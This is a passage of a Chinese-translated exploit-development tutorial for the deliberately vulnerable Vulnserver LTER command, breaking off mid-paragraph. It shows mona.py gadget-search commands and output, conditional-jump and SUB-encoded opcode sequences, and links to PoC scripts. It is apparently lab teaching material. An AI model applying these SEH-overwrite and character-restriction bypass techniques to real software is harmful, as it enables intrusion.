<html>
<head>
<title>[ExpDev] Vulnserver — Part 7</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">Vulnserver —第7部分</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/expdev-vulnserver-part-7-bfe9fb5fd1e6?source=collection_archive---------1-----------------------#2020-08-24">https://infosecwriteups.com/expdev-vulnserver-part-7-bfe9fb5fd1e6?source=collection_archive---------1-----------------------#2020-08-24</a></blockquote><div><div class="fc ih ii ij ik il"/><div class="im in io ip iq"><div class=""/><figure class="gl gn jr js jt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi jq"><img src="../Images/0d51950f6c8129b4e59cda1c82f25a08.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*rxpvfAOhhsMotB48YJD11A.png"/></div></div></figure><h1 id="00c2" class="kb kc it bd kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky bi translated">Vulnserver —第7部分(LTER — SEH覆盖+受限字符集)</h1><p id="e847" class="pw-post-body-paragraph kz la it lb b lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw im bi translated">这将是第七个<code class="fe lx ly lz ma b">vulnserver</code>漏洞系列。这次我们将模糊和利用易受攻击的命令<code class="fe lx ly lz ma b">LTER</code>。我们将通过一个<code class="fe lx ly lz ma b">SEH</code>覆盖来识别一个崩溃点，并绕过受限字符集，引入我们的编码外壳代码来获得外壳访问。</p></div><div class="ab cl mb mc hx md" role="separator"><span class="me bw bk mf mg mh"/><span class="me bw bk mf mg mh"/><span class="me bw bk mf mg"/></div><div class="im in io ip iq"><h1 id="85ed" class="kb kc it bd kd ke mi kg kh ki mj kk kl km mk ko kp kq ml ks kt ku mm kw kx ky bi translated">实验室环境</h1><ul class=""><li id="7655" class="mn mo it lb b lc ld lg lh lk mp lo mq ls mr lw ms mt mu mv bi translated"><strong class="lb iu">操作系统:</strong> Windows 7 (x86)</li><li id="846e" class="mn mo it lb b lc mw lg mx lk my lo mz ls na lw ms mt mu mv bi translated"><strong class="lb iu">调试器:</strong> OllyDbg，WinDbg (mona.py)</li><li id="6a91" class="mn mo it lb b lc mw lg mx lk my lo mz ls na lw ms mt mu mv bi translated">模糊器:模糊器</li><li id="378a" class="mn mo it lb b lc mw lg mx lk my lo mz ls na lw ms mt mu mv bi translated"><strong class="lb iu">目标:</strong> Vulnserver — <code class="fe lx ly lz ma b">LTER</code>命令(SEH覆盖+限制字符)</li></ul><p id="d5b6" class="pw-post-body-paragraph kz la it lb b lc nb le lf lg nc li lj lk nd lm ln lo ne lq lr ls nf lu lv lw im bi translated"><em class="ng">*详细的实验室设置指南可以在</em> <a class="ae nh" href="https://medium.com/@bigb0ss/expdev-vulnserver-part-1-ba35b9e36478" rel="noopener"> <em class="ng">这里找到</em> </a></p><ul class=""><li id="54b2" class="mn mo it lb b lc nb lg nc lk ni lo nj ls nk lw ms mt mu mv bi translated">Vulnserver —第一部分</li></ul></div><div class="ab cl mb mc hx md" role="separator"><span class="me bw bk mf mg mh"/><span class="me bw bk mf mg mh"/><span class="me bw bk mf mg"/></div><div class="im in io ip iq"><h1 id="e735" class="kb kc it bd kd ke mi kg kh ki mj kk kl km mk ko kp kq ml ks kt ku mm kw kx ky bi translated">初步侦察</h1><p id="5595" class="pw-post-body-paragraph kz la it lb b lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw im bi translated">让我们快速检查一下<code class="fe lx ly lz ma b">LTER</code>命令是做什么的。</p><figure class="nm nn no np gt ju gh gi paragraph-image"><div class="gh gi nl"><img src="../Images/b83d91bc043ea359b10708f0b0d1a0fd.png" data-original-src="https://miro.medium.com/v2/resize:fit:1294/format:webp/1*2ZMY84kYWLnhwGNAkCrwaA.png"/></div><figcaption class="nq nr gj gh gi ns nt bd b be z dk translated">LTER司令部</figcaption></figure></div><div class="ab cl mb mc hx md" role="separator"><span class="me bw bk mf mg mh"/><span class="me bw bk mf mg mh"/><span class="me bw bk mf mg"/></div><div class="im in io ip iq"><h1 id="16b8" class="kb kc it bd kd ke mi kg kh ki mj kk kl km mk ko kp kq ml ks kt ku mm kw kx ky bi translated">起毛</h1><p id="7517" class="pw-post-body-paragraph kz la it lb b lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw im bi translated">因为我们已经有了之前从<a class="ae nh" href="https://medium.com/@bigb0ss/expdev-vulnserver-part-2-46de4dd7bdde" rel="noopener">第1部分</a>创建的模糊化脚本，我们可以只为<code class="fe lx ly lz ma b">LTER</code>命令的模糊化器做一些小的修改。</p><figure class="nm nn no np gt ju gh gi paragraph-image"><div class="gh gi nu"><img src="../Images/c08ef131eaddc4edebf3021e2f6dafce.png" data-original-src="https://miro.medium.com/v2/resize:fit:974/format:webp/1*5qCVmLsfL6ayTfm-AeJ89Q.png"/></div><figcaption class="nq nr gj gh gi ns nt bd b be z dk translated">来源:<a class="ae nh" href="https://github.com/bigb0sss/OSCE/blob/master/vulnserver/LTER%20-%20SEH%20Overwrite/fuzz_lter.py" rel="noopener ugc nofollow" target="_blank">fuzz _ lter . py by bigboss</a></figcaption></figure><p id="9e8e" class="pw-post-body-paragraph kz la it lb b lc nb le lf lg nc li lj lk nd lm ln lo ne lq lr ls nf lu lv lw im bi translated">像往常一样，让我们用OllyDbg连接<code class="fe lx ly lz ma b">vulnserver</code>。然后，运行我们的fuzzer。</p><pre class="nm nn no np gt nv ma nw nx aw ny bi"><span id="7ac1" class="nz kc it ma b gy oa ob l oc od"><strong class="ma iu">### Running the Fuzzer</strong><br/>C:\Users\bigb0ss\Desktop\scripts\LTER&gt;python fuzz_lter.py</span></pre><p id="7029" class="pw-post-body-paragraph kz la it lb b lc nb le lf lg nc li lj lk nd lm ln lo ne lq lr ls nf lu lv lw im bi translated">运行我们的fuzzing脚本几秒钟后，<code class="fe lx ly lz ma b">vulnserver</code>崩溃了。从OllyDbg的崩溃中，我们可以清楚地看到<code class="fe lx ly lz ma b">LTER</code>命令和一定数量的字符导致了崩溃。</p><figure class="nm nn no np gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi oe"><img src="../Images/028459f2269e0de415d5a3e273e3b8c6.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Dirc_nYW8EDItTwiAf3uEg.png"/></div></div><figcaption class="nq nr gj gh gi ns nt bd b be z dk translated">初始碰撞</figcaption></figure><p id="8b3c" class="pw-post-body-paragraph kz la it lb b lc nb le lf lg nc li lj lk nd lm ln lo ne lq lr ls nf lu lv lw im bi translated">只需确认覆盖<code class="fe lx ly lz ma b">SEH handler</code>的值是从fuzzer发送的ASCII值。</p><pre class="nm nn no np gt nv ma nw nx aw ny bi"><span id="33de" class="nz kc it ma b gy oa ob l oc od">&gt;&gt;&gt; "p_.?".encode('hex')<br/>'705f2e3f'</span></pre></div><div class="ab cl mb mc hx md" role="separator"><span class="me bw bk mf mg mh"/><span class="me bw bk mf mg mh"/><span class="me bw bk mf mg"/></div><div class="im in io ip iq"><h2 id="6740" class="nz kc it bd kd of og dn kh oh oi dp kl lk oj ok kp lo ol om kt ls on oo kx op bi translated">模糊分析</h2><p id="abed" class="pw-post-body-paragraph kz la it lb b lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw im bi translated">从OllyDbg上的崩溃来看，大约是4000个字符导致了<code class="fe lx ly lz ma b">LTER</code>命令的崩溃。这次我们将跳过Boofuzz DB文件分析。</p></div><div class="ab cl mb mc hx md" role="separator"><span class="me bw bk mf mg mh"/><span class="me bw bk mf mg mh"/><span class="me bw bk mf mg"/></div><div class="im in io ip iq"><h1 id="57d5" class="kb kc it bd kd ke mi kg kh ki mj kk kl km mk ko kp kq ml ks kt ku mm kw kx ky bi translated">剥削</h1><h2 id="2975" class="nz kc it bd kd of og dn kh oh oi dp kl lk oj ok kp lo ol om kt ls on oo kx op bi translated">初始崩溃概念验证</h2><p id="6708" class="pw-post-body-paragraph kz la it lb b lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw im bi translated">让我们创建一个python脚本来重现崩溃。</p><figure class="nm nn no np gt ju gh gi paragraph-image"><div class="gh gi oq"><img src="../Images/7c312be3160d4edadbed9035fcb37539.png" data-original-src="https://miro.medium.com/v2/resize:fit:1048/format:webp/1*QAAvrFhZbbxXsco7zaKrCw.png"/></div><figcaption class="nq nr gj gh gi ns nt bd b be z dk translated">来源:<a class="ae nh" href="https://github.com/bigb0sss/OSCE/blob/master/vulnserver/LTER%20-%20SEH%20Overwrite/crash_lter.py" rel="noopener ugc nofollow" target="_blank">crash _ lter . py by bigboss</a></figcaption></figure><p id="a5eb" class="pw-post-body-paragraph kz la it lb b lc nb le lf lg nc li lj lk nd lm ln lo ne lq lr ls nf lu lv lw im bi translated">启动<code class="fe lx ly lz ma b">vulnserver</code>并将其连接到OllyDbg。然后，运行<code class="fe lx ly lz ma b">crash_lter.py</code>脚本。我们通过用“A”覆盖<code class="fe lx ly lz ma b">SEH handler</code>,成功地用PoC脚本再现了崩溃。</p><figure class="nm nn no np gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi or"><img src="../Images/41eec064e0ecad0a262e300aec9129c1.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*AJmoZQ0mzixOrUQW_Bwefg.png"/></div></div><figcaption class="nq nr gj gh gi ns nt bd b be z dk translated">再现车祸</figcaption></figure></div><div class="ab cl mb mc hx md" role="separator"><span class="me bw bk mf mg mh"/><span class="me bw bk mf mg mh"/><span class="me bw bk mf mg"/></div><div class="im in io ip iq"><h2 id="42a1" class="nz kc it bd kd of og dn kh oh oi dp kl lk oj ok kp lo ol om kt ls on oo kx op bi translated">检查不良/受限字符</h2><p id="11e5" class="pw-post-body-paragraph kz la it lb b lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw im bi translated">从最初的模糊化开始，我能够注意到一些字符集不允许用于<code class="fe lx ly lz ma b">LTER</code>命令。让我们试着确定哪些字符集是允许的，哪些是不允许的。</p><p id="cf4b" class="pw-post-body-paragraph kz la it lb b lc nb le lf lg nc li lj lk nd lm ln lo ne lq lr ls nf lu lv lw im bi translated">为此，我创建了一个简单的python脚本来生成所有十六进制字符。(<a class="ae nh" href="https://github.com/bigb0sss/OSCE/blob/master/scripts/allHexChar.py" rel="noopener ugc nofollow" target="_blank"> allHexChar.py </a>)</p><figure class="nm nn no np gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi os"><img src="../Images/b191a882979d913823bb5dc0328e6319.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*DLmfMzpGELdVlDsIvdMF9w.png"/></div></div><figcaption class="nq nr gj gh gi ns nt bd b be z dk translated">allHexChar.py</figcaption></figure><p id="9c5f" class="pw-post-body-paragraph kz la it lb b lc nb le lf lg nc li lj lk nd lm ln lo ne lq lr ls nf lu lv lw im bi translated">使用生成的字符集，让我们更新我们的PoC以确定对于<code class="fe lx ly lz ma b">LTER</code>命令是否有任何坏的/受限的字符。</p><figure class="nm nn no np gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi ot"><img src="../Images/dd43f6dfda0dbee644b8c5740427e083.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*WWgDMQE7FTaR3qYVJgrNNA.png"/></div></div><figcaption class="nq nr gj gh gi ns nt bd b be z dk translated">来源:<a class="ae nh" href="https://github.com/bigb0sss/OSCE/blob/master/vulnserver/LTER%20-%20SEH%20Overwrite/badchar_lter.py" rel="noopener ugc nofollow" target="_blank">bad char _ lter . py by bigboss</a></figcaption></figure><p id="1747" class="pw-post-body-paragraph kz la it lb b lc nb le lf lg nc li lj lk nd lm ln lo ne lq lr ls nf lu lv lw im bi translated">一旦我们运行上面的脚本，我们可以检查允许的字符。并且发现从<code class="fe lx ly lz ma b">\x01</code>到<code class="fe lx ly lz ma b">\x7F</code>的十六进制字符只允许用于<code class="fe lx ly lz ma b">LTER</code>命令。</p><figure class="nm nn no np gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi ou"><img src="../Images/d8c335a81d121adc696fddaa1963241f.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*6WCHqtN4pDkBuVFWNj57RQ.png"/></div></div><figcaption class="nq nr gj gh gi ns nt bd b be z dk translated">不良字符识别</figcaption></figure></div><div class="ab cl mb mc hx md" role="separator"><span class="me bw bk mf mg mh"/><span class="me bw bk mf mg mh"/><span class="me bw bk mf mg"/></div><div class="im in io ip iq"><h2 id="9d6d" class="nz kc it bd kd of og dn kh oh oi dp kl lk oj ok kp lo ol om kt ls on oo kx op bi translated">寻找偏移</h2><p id="b4d8" class="pw-post-body-paragraph kz la it lb b lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw im bi translated">接下来，我们需要找到在崩溃时控制<code class="fe lx ly lz ma b">SEH</code>处理器的偏移量。由于有如此多的坏字符，在这种情况下使用pattern_create可能有点困难。有几种不同的方法可以实现这一点，但最简单的方法之一是手动方法。(我在<a class="ae nh" href="https://medium.com/@bigb0ss/expdev-vulnserver-part-5-10942c8c4395" rel="noopener"> <em class="ng"> Vulnserver —第五部分(HTER — EIP覆盖)</em> </a> <em class="ng"> </em>中详细介绍了这一点<em class="ng">。)</em></p><figure class="nm nn no np gt ju gh gi paragraph-image"><div class="gh gi ov"><img src="../Images/ffa51134a39a84836758ed3137ba6389.png" data-original-src="https://miro.medium.com/v2/resize:fit:1012/format:webp/1*ciHDu5VfozfmYEbLdbG7ow.png"/></div><figcaption class="nq nr gj gh gi ns nt bd b be z dk translated">来源:<a class="ae nh" href="https://github.com/bigb0sss/OSCE/blob/master/vulnserver/LTER%20-%20SEH%20Overwrite/offset_lter.py" rel="noopener ugc nofollow" target="_blank">offset _ liter . py by bigboss</a></figcaption></figure><p id="6c14" class="pw-post-body-paragraph kz la it lb b lc nb le lf lg nc li lj lk nd lm ln lo ne lq lr ls nf lu lv lw im bi translated">我们可以在3520找到偏移量来控制<code class="fe lx ly lz ma b">SEH</code>处理器。</p><figure class="nm nn no np gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi ow"><img src="../Images/94c3adea593fb0ddeec49e0da9e0d35c.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*QCE-3zpDCVlCEfZA3QoiKw.png"/></div></div><figcaption class="nq nr gj gh gi ns nt bd b be z dk translated">确认偏移</figcaption></figure><p id="ac16" class="pw-post-body-paragraph kz la it lb b lc nb le lf lg nc li lj lk nd lm ln lo ne lq lr ls nf lu lv lw im bi translated">现在，我们都准备好在碰撞时控制<code class="fe lx ly lz ma b">SEH</code>。</p></div><div class="ab cl mb mc hx md" role="separator"><span class="me bw bk mf mg mh"/><span class="me bw bk mf mg mh"/><span class="me bw bk mf mg"/></div><div class="im in io ip iq"><h2 id="27a2" class="nz kc it bd kd of og dn kh oh oi dp kl lk oj ok kp lo ol om kt ls on oo kx op bi translated">寻找流行音乐</h2><p id="dc96" class="pw-post-body-paragraph kz la it lb b lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw im bi translated">对于典型的<code class="fe lx ly lz ma b">SEH</code>覆盖漏洞利用，我们需要找到<code class="fe lx ly lz ma b">POP POP RET</code>指令小工具。我们将使用mona.py的<code class="fe lx ly lz ma b">seh</code>命令在vulnserver应用程序的dll中搜索<code class="fe lx ly lz ma b">POP POP RET</code>。首先，将<code class="fe lx ly lz ma b">vulnserver</code>连接到WinDbg并运行以下命令:</p><pre class="nm nn no np gt nv ma nw nx aw ny bi"><span id="4e91" class="nz kc it ma b gy oa ob l oc od"><strong class="ma iu">### Mona.py Finding "POP POP RET"</strong></span><span id="8947" class="nz kc it ma b gy ox ob l oc od">!py mona seh -cm safeseh=off -cp nonull,ascii -o -cpb '\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff'</span><span id="e0cb" class="nz kc it ma b gy ox ob l oc od"><em class="ng">* We can use '-cpb' flag to specify which characters are restricted/bad</em></span><span id="6538" class="nz kc it ma b gy ox ob l oc od">...snip...<br/>[+] Results : <br/><strong class="ma iu">0x6250160a</strong> |   0x6250160a : pop esi # pop ebp # ret  | ascii {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\bigb0ss\Desktop\software\vulnserver\essfunc.dll)<br/><strong class="ma iu">0x6250172b</strong> |   0x6250172b : pop edi # pop ebp # ret  | asciiprint,ascii {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\bigb0ss\Desktop\software\vulnserver\essfunc.dll)<br/><strong class="ma iu">0x6250195e</strong> |   0x6250195e : pop edi # pop ebp # ret  | asciiprint,ascii {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\bigb0ss\Desktop\software\vulnserver\essfunc.dll)<br/><strong class="ma iu">0x6250120b</strong> |   0x6250120b : pop ecx # pop ecx # ret  | ascii {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\bigb0ss\Desktop\software\vulnserver\essfunc.dll)<br/>    Found a total of 4 pointers</span></pre><p id="89cf" class="pw-post-body-paragraph kz la it lb b lc nb le lf lg nc li lj lk nd lm ln lo ne lq lr ls nf lu lv lw im bi translated">让我们使用找到的<code class="fe lx ly lz ma b">POP POP RET</code>小工具之一。在我们的例子中，我们将使用<code class="fe lx ly lz ma b">0x6250120b</code>。更新PoC脚本。</p><figure class="nm nn no np gt ju gh gi paragraph-image"><div class="gh gi oy"><img src="../Images/388932fe827abfbda3bdd8314803f0f7.png" data-original-src="https://miro.medium.com/v2/resize:fit:1082/format:webp/1*DJh0JSeDPZft8GuVJaKKOg.png"/></div><figcaption class="nq nr gj gh gi ns nt bd b be z dk translated">来源:<a class="ae nh" href="https://github.com/bigb0sss/OSCE/blob/master/vulnserver/LTER%20-%20SEH%20Overwrite/pop-pop-ret_lter.py" rel="noopener ugc nofollow" target="_blank">pop-pop-ret _ lter . py by bigboss</a></figcaption></figure><p id="1310" class="pw-post-body-paragraph kz la it lb b lc nb le lf lg nc li lj lk nd lm ln lo ne lq lr ls nf lu lv lw im bi translated">并再次将vulnserver附加到OllyDbg，并在<code class="fe lx ly lz ma b">0x6250120b</code>地址设置一个断点。</p><figure class="nm nn no np gt ju gh gi paragraph-image"><div class="gh gi oz"><img src="../Images/244a6825a43d66ce65baec4033b877fd.png" data-original-src="https://miro.medium.com/v2/resize:fit:770/format:webp/1*yMTJLAkVAYkgrcNwwUJ04A.png"/></div><figcaption class="nq nr gj gh gi ns nt bd b be z dk translated">断点</figcaption></figure><p id="a760" class="pw-post-body-paragraph kz la it lb b lc nb le lf lg nc li lj lk nd lm ln lo ne lq lr ls nf lu lv lw im bi translated">当我们运行PoC脚本时，我们确实碰到了<code class="fe lx ly lz ma b">POP POP RET</code>地址，即断点。一旦我们允许异常处理程序，我们将在<code class="fe lx ly lz ma b">nSEH</code>位置到达我们控制的4字节缓冲区。</p><figure class="nm nn no np gt ju gh gi paragraph-image"><div class="gh gi pa"><img src="../Images/810667440df4f1ebbcd2336a9f04a0b4.png" data-original-src="https://miro.medium.com/v2/resize:fit:1064/format:webp/1*MAO4akfloZzpBeatsgpSWQ.png"/></div><figcaption class="nq nr gj gh gi ns nt bd b be z dk translated">RET指令后的地址</figcaption></figure></div><div class="ab cl mb mc hx md" role="separator"><span class="me bw bk mf mg mh"/><span class="me bw bk mf mg mh"/><span class="me bw bk mf mg"/></div><div class="im in io ip iq"><h2 id="5562" class="nz kc it bd kd of og dn kh oh oi dp kl lk oj ok kp lo ol om kt ls on oo kx op bi translated">#1阶段外壳代码—条件JMP (nSEH)</h2><p id="9e95" class="pw-post-body-paragraph kz la it lb b lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw im bi translated">有了这4个字节的空间，我们想从<code class="fe lx ly lz ma b">nSEH</code>(下一个<code class="fe lx ly lz ma b">SEH</code>)跳到任何内存位置。正如你可能已经注意到的，我们不能使用像<code class="fe lx ly lz ma b">\xEB\x80</code>这样的普通短跳转来跳转到我们控制缓冲区的位置，因为<code class="fe lx ly lz ma b">\xEB</code>对这个命令来说是一个坏字符。我们需要有点创意。</p><p id="41aa" class="pw-post-body-paragraph kz la it lb b lc nb le lf lg nc li lj lk nd lm ln lo ne lq lr ls nf lu lv lw im bi translated">我们可以使用零标志(ZF)来利用条件跳转。</p><figure class="nm nn no np gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi pb"><img src="../Images/0525c187358f601b61a109e09be09990.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*JZcw7sjjHPamp3Qk-e9NEg.png"/></div></div><figcaption class="nq nr gj gh gi ns nt bd b be z dk translated">来源:http://unixwiz.net/techtips/x86-jumps.html</figcaption></figure><p id="6f51" class="pw-post-body-paragraph kz la it lb b lc nb le lf lg nc li lj lk nd lm ln lo ne lq lr ls nf lu lv lw im bi translated"><code class="fe lx ly lz ma b">JZ</code> (=零跳转)和<code class="fe lx ly lz ma b">JNZ</code> (=非零跳转)指令分别只占用<code class="fe lx ly lz ma b">\x74</code>和<code class="fe lx ly lz ma b">\x75</code>各1个字节。我们能做的是，因为我们不知道在异常处理程序开始后，我们的寄存器是否会把ZF设为0，我们可以把这两个条件转移指令一个接一个地放进去；因此，无论(ZF == 0或ZF！= 0)跳转将会发生。</p><pre class="nm nn no np gt nv ma nw nx aw ny bi"><span id="df76" class="nz kc it ma b gy oa ob l oc od"><strong class="ma iu">### Conditional Jump</strong></span><span id="3692" class="nz kc it ma b gy ox ob l oc od">\x75\x08         <strong class="ma iu">; JNZ SHORT [+0x10] = Jump if ZF is not 0</strong><br/>\x74\x06         <strong class="ma iu">; JZ SHORT [+0x8] = Jump if ZF is 0</strong></span></pre><figure class="nm nn no np gt ju gh gi paragraph-image"><div class="gh gi pc"><img src="../Images/ada37c0c598de95edfd2e8594fff6c23.png" data-original-src="https://miro.medium.com/v2/resize:fit:1058/format:webp/1*Kj0c6f7SzKoKSewMC_DCBQ.png"/></div><figcaption class="nq nr gj gh gi ns nt bd b be z dk translated">有条件原地跳转</figcaption></figure><p id="34d5" class="pw-post-body-paragraph kz la it lb b lc nb le lf lg nc li lj lk nd lm ln lo ne lq lr ls nf lu lv lw im bi translated">在我们的例子中，这个条件跳转将成功地把我们的执行重定向到位置<code class="fe lx ly lz ma b">0x016EFFCE</code>。我们将有大约50个字节来控制新的呼吸空间。</p><figure class="nm nn no np gt ju gh gi paragraph-image"><div class="gh gi pd"><img src="../Images/a9a7bbb29415290eb2adbf56640bcead.png" data-original-src="https://miro.medium.com/v2/resize:fit:1184/format:webp/1*vSRRufb4Mh6MVKq9bSYCzw.png"/></div><figcaption class="nq nr gj gh gi ns nt bd b be z dk translated">在条件跳转之后</figcaption></figure><ul class=""><li id="0966" class="mn mo it lb b lc nb lg nc lk ni lo nj ls nk lw ms mt mu mv bi translated">更新了第一阶段外壳代码PoC脚本:<a class="ae nh" href="https://github.com/bigb0sss/OSCE/blob/master/vulnserver/LTER%20-%20SEH%20Overwrite/1st-stage_lter.py" rel="noopener ugc nofollow" target="_blank">第一阶段_lter.py </a></li></ul></div><div class="ab cl mb mc hx md" role="separator"><span class="me bw bk mf mg mh"/><span class="me bw bk mf mg mh"/><span class="me bw bk mf mg"/></div><div class="im in io ip iq"><h2 id="1939" class="nz kc it bd kd of og dn kh oh oi dp kl lk oj ok kp lo ol om kt ls on oo kx op bi translated">#2阶段外壳代码—编码的短JMP</h2><p id="1a8b" class="pw-post-body-paragraph kz la it lb b lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw im bi translated">由于我们只有50字节的缓冲区，我们很可能引入另一个跳转指令来将指针重新定位到一个更大的区域。但是我们仍然受到字符集的限制，我们需要先做一个短的JMP ( <code class="fe lx ly lz ma b">\xEB\x80</code>)，然后可能做一个长的JMP。</p><p id="be1c" class="pw-post-body-paragraph kz la it lb b lc nb le lf lg nc li lj lk nd lm ln lo ne lq lr ls nf lu lv lw im bi translated">我们将使用<strong class="lb iu">子编码</strong>来规避字符限制。首先，我们需要调整当前的<code class="fe lx ly lz ma b">ESP</code>寄存器，指向我们编码的外壳代码将被解码的地方。</p><pre class="nm nn no np gt nv ma nw nx aw ny bi"><span id="dd8b" class="nz kc it ma b gy oa ob l oc od"><strong class="ma iu">### ESP Alignment (Short JMP)</strong></span><span id="0e92" class="nz kc it ma b gy ox ob l oc od">\x54             # PUSH ESP <br/>\x58             # POP EAX<br/>\x66\x05\x59\x13 # ADD AX,0x1359 (<em class="ng">018BFFFD — 016EECA4 = 0x1359</em>)<br/>\x50             # PUSH EAX<br/>\x5C             # POP ESP</span></pre><p id="b564" class="pw-post-body-paragraph kz la it lb b lc nb le lf lg nc li lj lk nd lm ln lo ne lq lr ls nf lu lv lw im bi translated">你可能想知道为什么我们要把<code class="fe lx ly lz ma b">0x1359</code>加到<code class="fe lx ly lz ma b">AX</code>上，因为我们当前的<code class="fe lx ly lz ma b">ESP</code>等于<code class="fe lx ly lz ma b">0x18BFFFD</code>，我们想把我们的<code class="fe lx ly lz ma b">ESP</code>从最后一个“C”(<code class="fe lx ly lz ma b">\x43</code>)向上对齐2个字节，这样我们就可以把解码后的短JMP ( <code class="fe lx ly lz ma b">\xEB\x80</code>)放在那里。</p><figure class="nm nn no np gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi pe"><img src="../Images/27ba2505242f0c9cca7e98cc00867793.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*9OX4_2rfbNwqWRq9w6eE7g.png"/></div></div><figcaption class="nq nr gj gh gi ns nt bd b be z dk translated">ESP校准</figcaption></figure><p id="5b51" class="pw-post-body-paragraph kz la it lb b lc nb le lf lg nc li lj lk nd lm ln lo ne lq lr ls nf lu lv lw im bi translated">接下来，我们需要在<code class="fe lx ly lz ma b">ESP</code>比对之后添加子编码的短JMP ( <code class="fe lx ly lz ma b">\xEB\x80</code>)外壳代码。还是因为<code class="fe lx ly lz ma b">\xEB</code>是一个坏角色。解释的编码过程如下:</p><pre class="nm nn no np gt nv ma nw nx aw ny bi"><span id="a279" class="nz kc it ma b gy oa ob l oc od">1) Zero out the EAX<br/>   &gt; AND EAX,0x554e4d4a<br/>     AND EAX,0x2a313235</span><span id="7f01" class="nz kc it ma b gy ox ob l oc od">1) Adding 2 NOPs to \xEB\x80\x90\x90 <br/>   &gt; \xEB\x80\x90\x90</span><span id="6d33" class="nz kc it ma b gy ox ob l oc od">2) Covert it to big-endian <br/>   &gt; 909080EB</span><span id="ecb3" class="nz kc it ma b gy ox ob l oc od">3) Hex mathematics<br/>   &gt; 0 - 909080EB = 0xFFFFFFFF - 0x909080EB + 1 = 0x6F6F7F15</span><span id="67b7" class="nz kc it ma b gy ox ob l oc od">4) Convert it to <br/>   &gt; 0x16F6F7F15</span><span id="a1ac" class="nz kc it ma b gy ox ob l oc od">5) Make the value to 0 using SUB encoding (<em class="ng">* w/ ONLY allowed chars</em>)<br/>        0x16F6F7F15<br/>   sub  0x7F7F7F7F<br/>   sub  0x7F7F7F7F<br/>   sub  0x50505002<br/>   sub  0x20203015<br/>   -----------------<br/>        0x00000000</span><span id="14a7" class="nz kc it ma b gy ox ob l oc od"><strong class="ma iu">### Encoded Short JMP (SUB Encoding)</strong></span><span id="590b" class="nz kc it ma b gy ox ob l oc od">\x25\x4A\x4D\x4E\x55    # Zero out EAX<br/>\x25\x35\x32\x31\x2A    # <br/>\x2D\x7F\x7F\x7F\x7F    # Carving \xEB\x80\x90\x90 <br/>\x2D\x7F\x7F\x7F\x7F    # <br/>\x2D\x02\x50\x50\x50    # <br/>\x2D\x15\x30\x20\x20    # <br/>\x50                    # PUSH EAX</span></pre><figure class="nm nn no np gt ju gh gi paragraph-image"><div class="gh gi pf"><img src="../Images/adccab89f5a3aecb3e463643cab93f97.png" data-original-src="https://miro.medium.com/v2/resize:fit:1060/format:webp/1*sm1Ojm44ZH0hnsIJBtQINA.png"/></div><figcaption class="nq nr gj gh gi ns nt bd b be z dk translated">编码短JMP</figcaption></figure><p id="2e00" class="pw-post-body-paragraph kz la it lb b lc nb le lf lg nc li lj lk nd lm ln lo ne lq lr ls nf lu lv lw 